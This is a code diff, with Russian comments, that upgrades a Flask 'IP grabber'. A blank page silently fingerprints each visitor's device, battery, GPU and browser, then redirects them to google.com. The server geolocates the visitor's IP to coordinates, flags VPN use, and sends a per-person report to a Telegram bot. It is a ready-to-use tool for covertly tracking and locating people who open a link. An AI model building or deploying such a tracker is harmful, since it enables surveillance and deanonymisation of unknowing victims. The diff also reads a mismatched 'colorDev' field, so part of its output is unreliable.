@@ -29,7 +29,7 @@ def send_telegram_document(file_path, caption):
     print(f"Ошибка отправки файла: {e}")
 
 
-# HTML-прокладка со сбором расширенных данных через JavaScript
+# Продвинутый сборщик информации для ПК, Android и iOS
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -39,26 +39,63 @@ HTML_PAGE = """
 </head>
 <body>
     <script>
-        const data = {
-            screenResolution: window.screen.width + "x" + window.screen.height,
-            colorDepth: window.screen.colorDepth,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            language: navigator.language,
-            platform: navigator.platform,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
-            deviceMemory: navigator.deviceMemory || 'Неизвестно',
-            cookiesEnabled: navigator.cookieEnabled
-        };
+        async function gatherData() {
+            let batteryLevel = 'Недоступно';
+            let batteryCharging = 'Неизвестно';
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batteryLevel = Math.round(b.level * 100) + '%';
+                    batteryCharging = b.charging ? 'Да' : 'Нет';
+                }
+            } catch(e) {}
 
-        fetch('/collect', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        }).then(() => {
-            window.location.href = "https://google.com";
-        }).catch(() => {
-            window.location.href = "https://google.com";
-        });
+            let glVendor = 'Неизвестно';
+            let glRenderer = 'Неизвестно';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch(e) {}
+
+            const data = {
+                screenResolution: window.screen.width + "x" + window.screen.height,
+                availResolution: window.screen.availWidth + "x" + window.screen.availHeight,
+                colorDepth: window.screen.colorDepth + "-bit",
+                pixelRatio: window.devicePixelRatio || 1,
+                orientation: (screen.orientation || {}).type || 'Не определена',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language || navigator.userLanguage,
+                languages: (navigator.languages || []).join(', '),
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
+                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                cookiesEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
+                onLine: navigator.onLine ? 'Да' : 'Нет',
+                batteryLevel: batteryLevel,
+                batteryCharging: batteryCharging,
+                gpuVendor: glVendor,
+                gpuRenderer: glRenderer
+            };
+
+            fetch('/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                window.location.href = "https://google.com";
+            }).catch(() => {
+                window.location.href = "https://google.com";
+            });
+        }
+        gatherData();
     </script>
 </body>
 </html>
@@ -74,7 +111,6 @@ def index():
 def collect():
   client_data = request.json or {}
 
-  # Получаем IP-адрес
   ip = request.headers.get(
       "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
   )
@@ -84,11 +120,11 @@ def collect():
   visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
   user_agent = request.headers.get("User-Agent", "Не определен")
 
-  # Запрос геоданных по IP через бесплатный сервис
+  # Запрос геолокации по IP
   geo_info = {}
   try:
     geo_resp = requests.get(
-        f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,query",
+        f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,lat,lon,timezone,proxy",
         timeout=3,
     )
     if geo_resp.status_code == 200:
@@ -100,43 +136,75 @@ def collect():
   region = geo_info.get("regionName", "Не определено")
   city = geo_info.get("city", "Не определено")
   isp = geo_info.get("isp", "Не определено")
+  org = geo_info.get("org", "Не определено")
+  lat = geo_info.get("lat", "Н/Д")
+  lon = geo_info.get("lon", "Н/Д")
+  is_vpn = "Да" if geo_info.get("proxy") else "Нет / Неизвестно"
 
-  # Чистый структурированный лог без лишнего мусора
+  # Формируем чистый персональный файл для конкретного пользователя (никакого старого мусора)
+  safe_ip = ip.replace(":", "_")
+  file_name = f"log_{safe_ip}.txt"
+
   log_content = (
-      f"=== ИНФОРМАЦИЯ О ПЕРЕХОДЕ ===\n"
-      f"Время: {visit_time}\n"
+      f"========================================\n"
+      f"           ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ\n"
+      f"========================================\n"
+      f"Время визита: {visit_time}\n"
       f"IP-адрес: {ip}\n"
+      f"Возможный VPN/Proxy: {is_vpn}\n"
+      f"\n"
+      f"[ГЕОЛОКАЦИЯ ПО IP]\n"
       f"Страна: {country}\n"
       f"Регион: {region}\n"
       f"Город: {city}\n"
+      f"Широта / Долгота: {lat}, {lon}\n"
       f"Провайдер (ISP): {isp}\n"
+      f"Организация: {org}\n"
+      f"\n"
+      f"[ПАРАМЕТРЫ УСТРОЙСТВА И ЭКРАНА]\n"
       f"Разрешение экрана: {client_data.get('screenResolution', 'Н/Д')}\n"
-      f"Часовой пояс: {client_data.get('timezone', 'Н/Д')}\n"
-      f"Язык системы: {client_data.get('language', 'Н/Д')}\n"
-      f"Платформа: {client_data.get('platform', 'Н/Д')}\n"
+      f"Доступная область экрана: {client_data.get('availResolution', 'Н/Д')}\n"
+      f"Глубина цвета: {client_data.get('colorDev', 'Н/Д')}\n"
+      f"Плотность пикселей (DPR): {client_data.get('pixelRatio', 'Н/Д')}\n"
+      f"Ориентация экрана: {client_data.get('orientation', 'Н/Д')}\n"
+      f"Точки касания (Тач): {client_data.get('maxTouchPoints', '0')}\n"
+      f"Платформа ОС: {client_data.get('platform', 'Н/Д')}\n"
       f"Ядра процессора: {client_data.get('hardwareConcurrency', 'Н/Д')}\n"
-      f"Оперативная память: {client_data.get('deviceMemory', 'Н/Д')} ГБ\n"
-      f"User-Agent: {user_agent}\n"
-      f"===============================\n\n"
+      f"Оперативная память: {client_data.get('deviceMemory', 'Н/Д')}\n"
+      f"Видеокарта (GPU Vendor): {client_data.get('gpuVendor', 'Н/Д')}\n"
+      f"Видеокарта (GPU Renderer): {client_data.get('gpuRenderer', 'Н/Д')}\n"
+      f"\n"
+      f"[СИСТЕМНЫЕ НАСТРОЙКИ БРАУЗЕРА]\n"
+      f"Язык системы: {client_data.get('language', 'Н/Д')}\n"
+      f"Поддерживаемые языки: {client_data.get('languages', 'Н/Д')}\n"
+      f"Часовой пояс браузера: {client_data.get('timezone', 'Н/Д')}\n"
+      f"Уровень заряда батареи: {client_data.get('batteryLevel', 'Н/Д')}\n"
+      f"Заряжается: {client_data.get('batteryCharging', 'Н/Д')}\n"
+      f"Cookies включены: {client_data.get('cookiesEnabled', 'Н/Д')}\n"
+      f"\n"
+      f"[ТЕХНИЧЕСКИЙ USER-AGENT]\n"
+      f"{user_agent}\n"
+      f"========================================\n"
   )
 
-  file_name = "log.txt"
-  with open(file_name, "a", encoding="utf-8") as f:
+  with open(file_name, "w", encoding="utf-8") as f:
     f.write(log_content)
 
-  # Компактное сообщение для Telegram
+  # Компактное уведомление для Telegram
   message_text = (
-      f"🔔 *Новый переход!*\n\n"
+      f"🔔 *Новый точный переход!*\n\n"
       f"⏱ *Время:* `{visit_time}`\n"
-      f"🌐 *IP:* `{ip}`\n"
+      f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
       f"📍 *Место:* `{country}, {city}`\n"
       f"🏢 *Провайдер:* `{isp}`\n"
-      f"💻 *Экран:* `{client_data.get('screenResolution', 'Н/Д')}`\n"
-      f"🌍 *Часовой пояс:* `{client_data.get('timezone', 'Н/Д')}`"
+      f"💻 *Экран / Платформа:* `{client_data.get('screenResolution', 'Н/Д')} | {client_data.get('platform', 'Н/Д')}`\n"
+      f"⚙️️ *Процессор / Память:* `{client_data.get('hardwareConcurrency', 'Н/Д')} ядер, {client_data.get('deviceMemory', 'Н/Д')}`"
   )
 
   send_telegram_message(message_text)
-  send_telegram_document(file_name, caption="📁 Полный структурированный лог")
+  send_telegram_document(
+      file_name, caption=f"📁 Персональный лог для IP: {ip}"
+  )
 
   return jsonify({"status": "ok"})
 
